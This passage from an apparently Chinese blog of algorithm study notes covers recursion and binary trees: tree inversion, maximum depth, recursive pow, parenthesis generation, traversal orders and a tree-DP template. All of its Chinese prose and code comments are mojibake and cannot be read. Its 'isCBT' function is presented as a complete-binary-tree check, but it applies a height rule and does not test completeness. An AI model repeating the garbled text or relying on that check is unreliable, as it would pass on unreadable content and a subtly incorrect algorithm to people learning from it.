class="hljs-comment">// é€’å½’å¤„ç†å·¦å³å­æ ‘</span><br>        <span class="hljs-built_in">invertTree</span>(root-&gt;left);<br>        <span class="hljs-built_in">invertTree</span>(root-&gt;right);<br><br>        <span class="hljs-keyword">return</span> root;  <span class="hljs-comment">// è¿”å›ç¿»è½¬åçš„æ ¹èŠ‚ç‚¹</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">// è¾…åŠ©å‡½æ•°ï¼šå…ˆåºéå†è¾“å‡ºäºŒå‰æ ‘çš„èŠ‚ç‚¹å€¼</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preOrder</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>    cout &lt;&lt; root-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-built_in">preOrder</span>(root-&gt;left);<br>    <span class="hljs-built_in">preOrder</span>(root-&gt;right);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦"><a href="#äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦" class="headerlink" title="äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦"></a>äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦</h4><p>æ€è·¯ä¸€ (è‡ªåº•å‘ä¸Šç»Ÿè®¡ä¿¡æ¯ï¼Œåˆ†æ²»æ€æƒ³) æœ€å¤§æ·±åº¦ &#x3D;max(å·¦å­æ ‘æœ€å¤§æ·±åº¦ï¼Œå³å­æ ‘æœ€å¤§æ·±åº¦)+1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// é€’å½’è®¡ç®—äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¦‚æœèŠ‚ç‚¹ä¸ºç©ºï¼Œæ·±åº¦ä¸º0</span><br>        <span class="hljs-comment">// é€’å½’è®¡ç®—å·¦å³å­æ ‘çš„æ·±åº¦ï¼Œå¹¶è¿”å›è¾ƒå¤§çš„æ·±åº¦åŠ 1</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(<span class="hljs-built_in">maxDepth</span>(root-&gt;left), <span class="hljs-built_in">maxDepth</span>(root-&gt;right)) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ€è·¯äºŒ(è‡ªé¡¶å‘ä¸‹ç»´æŠ¤ä¿¡æ¯)<br>æŠŠâ€œæ·±åº¦â€ä½œä¸ºä¸€ä¸ªå…¨å±€å˜é‡â€“ä¸€ä¸ªè·Ÿéšç»“ç‚¹ç§»åŠ¨è€ŒåŠ¨æ€å˜åŒ–çš„ä¿¡æ¯é€’å½’ä¸€å±‚ï¼Œå˜é‡+1ï¼Œåœ¨å¶å­å¤„æ›´æ–°ç­”æ¡ˆè¿™ç§å†™æ³•éœ€è¦æ³¨æ„ä¿æŠ¤å’Œè¿˜åŸç°åœº</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Solution</span>() : <span class="hljs-built_in">depth</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">ans</span>(<span class="hljs-number">0</span>) &#123;&#125;  <span class="hljs-comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–</span><br>    <span class="hljs-comment">// è®¡ç®—äºŒå‰æ ‘æœ€å¤§æ·±åº¦çš„ä¸»å‡½æ•°</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-built_in">calc</span>(root);  <span class="hljs-comment">// è°ƒç”¨é€’å½’å‡½æ•°</span><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> depth;  <span class="hljs-comment">// å½“å‰é€’å½’æ·±åº¦</span><br>    <span class="hljs-type">int</span> ans;    <span class="hljs-comment">// å­˜å‚¨æœ€å¤§æ·±åº¦</span><br><br>    <span class="hljs-comment">// é€’å½’è®¡ç®—æ·±åº¦çš„å‡½æ•°</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">calc</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// ç©ºèŠ‚ç‚¹è¿”å›</span><br>        <span class="hljs-comment">// æ›´æ–°æœ€å¤§æ·±åº¦</span><br>        ans = <span class="hljs-built_in">max</span>(ans, depth + <span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// æ·±åº¦å¢åŠ ï¼Œé€’å½’éå†å·¦å­æ ‘å’Œå³å­æ ‘</span><br>        depth++;<br>        <span class="hljs-built_in">calc</span>(root-&gt;left);<br>        <span class="hljs-built_in">calc</span>(root-&gt;right);<br>        <span class="hljs-comment">// å›æº¯æ—¶å‡å°‘æ·±åº¦</span><br>        depth--;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="é€’å½’å®ç°-pow-x-n-é—®é¢˜ï¼š"><a href="#é€’å½’å®ç°-pow-x-n-é—®é¢˜ï¼š" class="headerlink" title="é€’å½’å®ç° pow(x, n) é—®é¢˜ï¼š"></a><strong>é€’å½’å®ç° <code>pow(x, n)</code> é—®é¢˜</strong>ï¼š</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">myPow</span><span class="hljs-params">(<span class="hljs-type">double</span> x, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// ä»»ä½•æ•°çš„ 0 æ¬¡æ–¹éƒ½ç­‰äº 1</span><br>    <span class="hljs-keyword">if</span> (n == INT_MIN) <span class="hljs-keyword">return</span> <span class="hljs-number">1.0</span> / (<span class="hljs-built_in">myPow</span>(x, -(n<span class="hljs-number">+1</span>)) * x);  <span class="hljs-comment">// å¤„ç† n ä¸ºæœ€å°è´Ÿæ•°çš„ç‰¹æ®Šæƒ…å†µ</span><br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1.0</span> / <span class="hljs-built_in">myPow</span>(x, -n);  <span class="hljs-comment">// è´Ÿæ•°æ¬¡å¹‚</span><br>    <span class="hljs-type">double</span> temp = <span class="hljs-built_in">myPow</span>(x, n / <span class="hljs-number">2</span>);  <span class="hljs-comment">// é€’å½’è®¡ç®—</span><br>    <span class="hljs-type">double</span> ans = temp * temp;  <span class="hljs-comment">// å¹³æ–¹</span><br>    <span class="hljs-keyword">if</span> (n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) ans *= x;  <span class="hljs-comment">// å¤„ç†å¥‡æ•°æ¬¡å¹‚</span><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åˆ†æ</strong>ï¼š</p><ul><li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šO(log n)ï¼Œé€’å½’æ¯æ¬¡å°† <code>n</code> å‡åŠã€‚</li><li><strong>ç©ºé—´å¤æ‚åº¦</strong>ï¼šO(log n)ï¼Œé€’å½’è°ƒç”¨æ ˆçš„æ·±åº¦ã€‚</li></ul><hr><h4 id="æ‹¬å·ç”Ÿæˆé—®é¢˜ï¼š"><a href="#æ‹¬å·ç”Ÿæˆé—®é¢˜ï¼š" class="headerlink" title="æ‹¬å·ç”Ÿæˆé—®é¢˜ï¼š"></a><strong>æ‹¬å·ç”Ÿæˆé—®é¢˜</strong>ï¼š</h4><p>ç»™å®šæ•´æ•° <code>n</code>ï¼Œç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„åŒ…å« <code>n</code> å¯¹æ‹¬å·çš„æœ‰æ•ˆç»„åˆã€‚</p><p><strong>ç®—æ³•æ€è·¯</strong>ï¼š</p><ul><li>ä½¿ç”¨é€’å½’ç”Ÿæˆæ‰€æœ‰æ‹¬å·ç»„åˆï¼Œä¾æ¬¡ç”Ÿæˆ <code>k</code> å¯¹æ‹¬å·ä¸ <code>n-k</code> å¯¹æ‹¬å·çš„ç»„åˆï¼Œå†å°†å®ƒä»¬åˆå¹¶ã€‚</li><li><strong>é€’å½’ä¼˜åŒ–</strong>ï¼šé€šè¿‡ <code>unordered_map</code> ç¼“å­˜ä¸­é—´ç»“æœï¼Œé¿å…é‡å¤è®¡ç®—ï¼ˆè®°å¿†åŒ–æœç´¢ï¼‰ã€‚</li><li>è®¾ç”Ÿæˆçš„æ‹¬å·ç»„åˆå¯ä»¥çœ‹ä½œ <code>S = (A)B</code>å…¶ä¸­ <code>A</code> æ˜¯åœ¨ <code>k-1</code> å¯¹æ‹¬å·çš„åŸºç¡€ä¸Šç”Ÿæˆçš„ç»„åˆï¼Œ<code>B</code> æ˜¯åœ¨ <code>n-k</code> å¯¹æ‹¬å·çš„åŸºç¡€ä¸Šç”Ÿæˆçš„ç»„åˆã€‚</li></ul><p><strong>ä»£ç å®ç°</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">generateParenthesis</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;&quot;</span>&#125;;  <span class="hljs-comment">// åŸºæœ¬æƒ…å†µï¼Œn=0æ—¶è¿”å›ç©ºå­—ç¬¦ä¸²</span><br>    <span class="hljs-keyword">if</span> (store.<span class="hljs-built_in">find</span>(n) != store.<span class="hljs-built_in">end</span>()) <span class="hljs-keyword">return</span> store[n];  <span class="hljs-comment">// å¦‚æœå·²ç»è®¡ç®—è¿‡ï¼Œç›´æ¥è¿”å›ç¼“å­˜çš„ç»“æœ</span><br>    <br>    vector&lt;string&gt; ans;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k++) &#123;  <span class="hljs-comment">// éå†æ‰€æœ‰å¯èƒ½çš„ k å€¼(A)B</span><br>        vector&lt;string&gt; A = <span class="hljs-built_in">generateParenthesis</span>(k - <span class="hljs-number">1</span>);  <span class="hljs-comment">// ç”Ÿæˆ k-1 å¯¹æ‹¬å·</span><br>        vector&lt;string&gt; B = <span class="hljs-built_in">generateParenthesis</span>(n - k);  <span class="hljs-comment">// ç”Ÿæˆ n-k å¯¹æ‹¬å·</span><br>        <span class="hljs-keyword">for</span> (string&amp; a : A) &#123;<br>            <span class="hljs-keyword">for</span> (string&amp; b : B) &#123;<br>                ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;(&quot;</span> + a + <span class="hljs-string">&quot;)&quot;</span> + b);  <span class="hljs-comment">// å°†ä¸¤éƒ¨åˆ†ç»„åˆ</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    store[n] = ans;  <span class="hljs-comment">// ç¼“å­˜å½“å‰ n å¯¹æ‹¬å·çš„æ‰€æœ‰ç»„åˆ</span><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-keyword">private</span>:<br>unordered_map&lt;<span class="hljs-type">int</span>, vector&lt;string&gt;&gt; store;  <span class="hljs-comment">// ç”¨äºè®°å¿†åŒ–æœç´¢ï¼Œé¿å…é‡å¤è®¡ç®—</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æ</strong>ï¼š</p><ul><li><strong>è®°å¿†åŒ–æœç´¢</strong>ï¼šé€šè¿‡ <code>unordered_map</code> ç¼“å­˜é€’å½’ä¸­é—´ç»“æœï¼Œé¿å…é‡å¤è®¡ç®—ï¼Œæå‡æ•ˆç‡ã€‚</li><li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šç†è®ºä¸Šä¸º O(4^n &#x2F; sqrt(n))ï¼Œå› ä¸ºæ¯æ¬¡é€’å½’ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„æ‹¬å·ç»„åˆã€‚</li></ul><hr><h2 id="åäº”-äºŒå‰æ ‘"><a href="#åäº”-äºŒå‰æ ‘" class="headerlink" title="åäº”.äºŒå‰æ ‘"></a>åäº”.äºŒå‰æ ‘</h2><p>äºŒå‰æ ‘æ˜¯ä¸€ç§æ ‘å½¢æ•°æ®ç»“æ„ï¼Œå…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šæœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œåˆ†åˆ«ç§°ä¸ºå·¦å­èŠ‚ç‚¹å’Œå³å­èŠ‚ç‚¹ã€‚</p><p><strong>éå†æ–¹å¼</strong>ï¼š</p><ul><li><strong>å‰åºéå†</strong>ï¼ˆPre-order Traversalï¼‰ï¼šæŒ‰æ ¹èŠ‚ç‚¹ -&gt; å·¦å­æ ‘ -&gt; å³å­æ ‘çš„é¡ºåºéå†ã€‚</li><li><strong>ä¸­åºéå†</strong>ï¼ˆIn-order Traversalï¼‰ï¼šæŒ‰å·¦å­æ ‘ -&gt; æ ¹èŠ‚ç‚¹ -&gt; å³å­æ ‘çš„é¡ºåºéå†ã€‚</li><li><strong>ååºéå†</strong>ï¼ˆPost-order Traversalï¼‰ï¼šæŒ‰å·¦å­æ ‘ -&gt; å³å­æ ‘ -&gt; æ ¹èŠ‚ç‚¹çš„é¡ºåºéå†ã€‚</li><li><strong>å±‚æ¬¡éå†</strong>ï¼ˆLevel-order Traversalï¼‰ï¼šæŒ‰å±‚ä»ä¸Šåˆ°ä¸‹ã€ä»å·¦åˆ°å³çš„é¡ºåºéå†æ ‘èŠ‚ç‚¹ã€‚</li></ul><h4 id="éå†æ–¹å¼æ€»ç»“ï¼š"><a href="#éå†æ–¹å¼æ€»ç»“ï¼š" class="headerlink" title="éå†æ–¹å¼æ€»ç»“ï¼š"></a><strong>éå†æ–¹å¼æ€»ç»“</strong>ï¼š</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// äºŒå‰æ ‘èŠ‚ç‚¹å®šä¹‰</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span> &#123;<br>    <span class="hljs-type">int</span> val;<br>    TreeNode* left;<br>    TreeNode* right;<br><br>    <span class="hljs-built_in">TreeNode</span>(<span class="hljs-type">int</span> value) : <span class="hljs-built_in">val</span>(value), <span class="hljs-built_in">left</span>(<span class="hljs-literal">nullptr</span>), <span class="hljs-built_in">right</span>(<span class="hljs-literal">nullptr</span>) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// å‰åºéå† (æ ¹-å·¦-å³)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preorder</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>    cout &lt;&lt; root-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-built_in">preorder</span>(root-&gt;left);<br>    <span class="hljs-built_in">preorder</span>(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">// ä¸­åºéå† (å·¦-æ ¹-å³)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">inorder</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">inorder</span>(root-&gt;left);<br>    cout &lt;&lt; root-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-built_in">inorder</span>(root-&gt;right);<br>&#125;<br><br><span class="hljs-comment">// ååºéå† (å·¦-å³-æ ¹)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">postorder</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">postorder</span>(root-&gt;left);<br>    <span class="hljs-built_in">postorder</span>(root-&gt;right);<br>    cout &lt;&lt; root-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// å±‚åºéå† (å¹¿åº¦ä¼˜å…ˆéå†)</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">levelOrder</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br>    queue&lt;TreeNode*&gt; q;<br>    q.<span class="hljs-built_in">push</span>(root);<br>    <br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>        TreeNode* node = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        cout &lt;&lt; node-&gt;val &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span> (node-&gt;left) q.<span class="hljs-built_in">push</span>(node-&gt;left);<br>        <span class="hljs-keyword">if</span> (node-&gt;right) q.<span class="hljs-built_in">push</span>(node-&gt;right);<br>    &#125;<br>&#125;<br>              a<br>            /  \<br>           b      c<br>         / \    / \<br>        d   e   f   g<br>                 <br>é€’å½’åºï¼š  a b d d d b e e e b a c f f f c g g g c a   è¿™æ˜¯è®¡ç®—æœºè§£å†³çš„æµç¨‹å³å·¦å³å’Œæœ¬èº«               <br>å‰ä¸­ååºå°±æ˜¯æŒ‘å“ªä¸ªæ˜¯ï¼šç¬¬ä¸€äºŒä¸‰æ¬¡å‡ºç°æ’åº            <br>è§„å¾‹ï¼šå…ˆåº:abdec | fg <br>        ååº:debf | gca     ä»»æ„é€‰ä¸€ä¸ªå­—æ¯ä¾‹å¦‚fï¼Œå…ˆåºå‰å’Œååºåçš„äº¤é›†caå°±æ˜¯å®ƒå…¨éƒ¨çš„ç¥–å…ˆ<br></code></pre></td></tr></table></figure><h3 id="é€’å½’æ¨¡æ¿"><a href="#é€’å½’æ¨¡æ¿" class="headerlink" title="é€’å½’æ¨¡æ¿"></a>é€’å½’æ¨¡æ¿</h3><p>æ ‘å½¢dpâ€”â€”ä»å·¦æ ‘åº•ç«¯å¼€å§‹å·¦å³å­©å­éƒ½è¦infoä¿¡æ¯ç„¶åæ•´åˆæˆä¸€ä¸ªä¿¡æ¯æˆä¸ºå­©å­ç»™çˆ¶ä¿¡æ¯</p><p>step1.æƒ³ä»¥xä¸ºå¤´ï¼ˆç­”æ¡ˆï¼‰æ€ä¹ˆå®ç°ï¼Œä¸æ˜¯xå¤´åˆæ€ä¹ˆå®ç°ï¼ŒæŠŠè¿™äº›å®ç°éœ€è¦çš„çŠ¶æ€ç©ºé—´infoåˆ—å‡ºæ±‚å…¨é›†</p><p>step2.è¿™äº›ä¿¡æ¯åˆå§‹åŒ–åœ¨ Info process ï¼Œå°†è¿™äº›ä¿¡æ¯åœ¨Info processè¿™ä¸ªå‡½æ•°é‡Œå®ç°ï¼Œå¦‚æœè¿™ä¸ªä¿¡æ¯æ¶‰åŠä¹‹å‰çš„åˆ†ç±»è®¨è®ºï¼Œå°±åˆ†å¤šæ¡ä»¶è®¨è®º</p><h3 id="ä¾‹é¢˜-6"><a href="#ä¾‹é¢˜-6" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="åˆ¤æ–­æ˜¯å¦ä¸ºå®Œå…¨äºŒå‰æ ‘"><a href="#åˆ¤æ–­æ˜¯å¦ä¸ºå®Œå…¨äºŒå‰æ ‘" class="headerlink" title="åˆ¤æ–­æ˜¯å¦ä¸ºå®Œå…¨äºŒå‰æ ‘"></a>åˆ¤æ–­æ˜¯å¦ä¸ºå®Œå…¨äºŒå‰æ ‘</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦ä¸ºå®Œå…¨äºŒå‰æ ‘ï¼Œç¬¬ä¸€ï¼Œæ­¤é¢˜ä¸ç”¨åŒºåˆ†æ˜¯ä¸æ˜¯å¤´ï¼Œåˆ¤æ–­éœ€è¦çœ‹å·¦å³å­©å­æ˜¯å¦æ˜¯å¹³è¡¡äºŒå‰æ ‘ï¼Œåšåˆ°è¿™é‡Œéœ€è¦çŸ¥é“å·¦å³å­©å­çš„é«˜åº¦ï¼Œæ‰€ä»¥infoä¿¡æ¯é‡Œéœ€è¦çŸ¥é“æ˜¯ä¸æ˜¯å¹³è¡¡äºŒå‰æ ‘å’Œé«˜åº¦æ˜¯å‡ å°±è¡Œã€‚ç„¶åå°±æ˜¯å¦‚ä½•åˆ¤æ–­æ˜¯å¦ä¸ºäºŒå‰æ ‘çš„ç®—æ³•ï¼Œå¦‚ä½•å¾—åˆ°é«˜åº¦çš„ç®—æ³•Info processå†™åœ¨è¿™ä¸ªå‡½æ•°é‡Œ,è¦ä¹ˆç©·ä¸¾å‡ºæ‰€æœ‰å¯èƒ½ï¼Œè¦ä¹ˆå†™ç®—æ³•åˆ¤æ–­</span><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> value;<br>    Node* left;<br>    Node* right;<br>    Node(<span class="hljs-type">int</span> data) : value(data), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span>   <span class="hljs-comment">//æ¯ä¸ªèŠ‚ç‚¹éœ€è¦çš„ä¿¡æ¯æ”¶é›†</span><br>    <span class="hljs-type">bool</span> isCBT;<br>    <span class="hljs-type">int</span> height;<br>    Info(<span class="hljs-type">bool</span> cbt, <span class="hljs-type">int</span> h) : isCBT(cbt), height(h) &#123;&#125;<br>&#125;;<br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(Node* X)</span> &#123;   <span class="hljs-comment">//åˆ¤æ–­é€»è¾‘è¿”å›ä¿¡æ¯</span><br>    <span class="hljs-keyword">if</span> (!X) <span class="hljs-keyword">return</span> Info(<span class="hljs-literal">true</span>, <span class="hljs-number">0</span>);<br>    Info leftInfo = process(X-&gt;left);<br>    Info rightInfo = process(X-&gt;right);<br>    <span class="hljs-type">int</span> height = max(leftInfo.height, rightInfo.height) + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">bool</span> isCBT = leftInfo.isCBT &amp;&amp; rightInfo.isCBT &amp;&amp;<br>                 (leftInfo.height == rightInfo.height || leftInfo.height == rightInfo.height + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> Info(isCBT, height);<br>&#125;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">isCBT</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> head ? process(head).isCBT : <span class="hljs-literal">true</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="æ˜¯å¦æ˜¯äºŒå‰æœç´¢æ ‘"><a href="#æ˜¯å¦æ˜¯äºŒå‰æœç´¢æ ‘" class="headerlink" title="æ˜¯å¦æ˜¯äºŒå‰æœç´¢æ ‘"></a>æ˜¯å¦æ˜¯äºŒå‰æœç´¢æ ‘</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//æ˜¯å¦æ˜¯äºŒå‰æœç´¢æ ‘</span><br>using namespace <span 